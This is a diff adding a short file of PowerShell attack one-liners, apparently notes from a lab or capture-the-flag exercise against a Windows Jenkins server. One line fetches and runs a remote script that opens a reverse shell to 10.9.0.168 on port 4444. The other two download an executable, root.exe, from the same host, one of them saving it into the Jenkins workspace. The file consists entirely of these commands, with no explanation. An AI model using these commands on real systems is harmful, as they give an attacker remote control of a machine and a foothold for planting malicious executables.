@@ -1,0 +1,6 @@
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.0.168:3000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.0.168 -Port 4444
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.168:3000/root.exe','root.exe')"
+
+
+Invoke-WebRequest -Uri "http://10.9.0.168:3000/root.exe" -OutFile "C:\Program Files (x86)\Jenkins\workspace\root.exe"
